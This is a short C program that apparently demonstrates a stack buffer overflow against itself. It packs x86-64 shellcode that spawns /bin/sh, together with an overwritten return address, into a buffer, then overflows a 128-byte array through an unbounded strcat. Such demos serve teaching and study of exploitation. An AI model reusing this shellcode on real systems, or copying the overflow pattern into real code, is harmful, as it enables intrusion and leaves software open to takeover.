#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define DEBUG
#ifdef DEBUG
#define DEBUG_OUTPUT printf
#else
#define DEBUG_OUTPUT(...) do{} while(0)
#endif
int parse(int sockfd)
{
  char greeting_text[128];
  char buf[256];
  memset(buf,0x41,256);buf[255]='\0';
  u_int8_t shell_code[]={0x31,0xc0,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,0x97,0xff,0x48,0xf7,0xdb,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05};
  u_int64_t buff_addr=(u_int64_t)&buf;
  memcpy(buf,shell_code,27); 
  memcpy(buf+124,&buff_addr,8);
  // Redirect stdout and stdin to the socket
  DEBUG_OUTPUT("%p %p\n", buf, greeting_text);
  printf("What is your name?\n");
  //fgets(buf, sizeof(buf), stdin);
  strcpy(greeting_text, "Hello, dear ");
  strcat(greeting_text, buf);
  printf("%s\n", greeting_text);
  return 0;
}
int main(int argc, char** argv)
{
  int connfd=0;
  parse(connfd);
  return 0;
}